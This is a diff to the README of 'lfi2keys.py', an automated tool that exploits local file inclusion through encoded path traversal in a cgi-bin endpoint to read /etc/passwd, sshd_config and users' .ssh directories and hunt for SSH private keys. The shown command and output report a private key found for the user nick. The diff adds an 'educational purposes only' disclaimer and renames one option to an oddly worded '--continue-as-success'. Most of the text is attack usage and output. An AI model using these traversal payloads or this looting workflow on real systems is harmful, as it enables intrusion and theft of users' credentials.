@@ -6,7 +6,7 @@ Provide the full URL of the vulnerable endpoint where you can read the `/etc/pas
 
 ```bash
 ┌──(kali㉿DC07 | 2025-02-12 00:13:37)-[~]
-└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-medium.txt -o keys.txt
+└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-medium.txt -a -o keys.txt
 
   _    ___ ___ ___ _  _______   _____ 
  | |  | __|_ _|_  ) |/ / __\ \ / / __|
@@ -15,12 +15,14 @@ Provide the full URL of the vulnerable endpoint where you can read the `/etc/pas
 
 LFI to SSH Private Keys - Automated Looting Script
 
+[*] The script provided is for educational purposes only, I am not responsible for your actions.
 [+] Valid /etc/passwd file found
 [+] Valid users exported:
-    miranda -> /home/miranda
-    steven -> /home/steven
-    mark -> /home/mark
-    nick -> /home/nick
+    root -> /root (UID: 0)
+    miranda -> /home/miranda (UID: 1001)
+    steven -> /home/steven (UID: 1002)
+    mark -> /home/mark (UID: 1003)
+    nick -> /home/nick (UID: 1004)
 [+] /etc/ssh/sshd_config file found
     PermitRootLogin: disabled
     PubkeyAuthentication: enabled
@@ -29,8 +31,7 @@ LFI to SSH Private Keys - Automated Looting Script
 [+] Checking for SSH metadata (authorized_keys and known_hosts)...
 [!] Found authorized_keys for nick: https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/nick/.ssh/authorized_keys
 [+] Starting to FUZZ
-[+] Private key found for nick at: https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/nick/.ssh/id_ecdsa
-[+] Results saved to keys.txt
+[!] Private key found for nick at: https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/nick/.ssh/id_ecdsa
 [+] Done (～￣▽￣)～
 ```
 
@@ -44,8 +45,8 @@ LFI to SSH Private Keys - Automated Looting Script
   -p PROXY, --proxy PROXY
                         Proxy URL (e.g., http://127.0.0.1:8080)
   -v, --verbose         Enable verbose mode for debugging
-  -a, --all             Also search the entire home directory (not just .ssh folder)
-  -c, --continue-on-success
+  -a, --all             Also search the entire home directory and additional paths
+  -c, --continue-as-success
                         Continue scanning all users for private keys even after a match is found
 ```
 
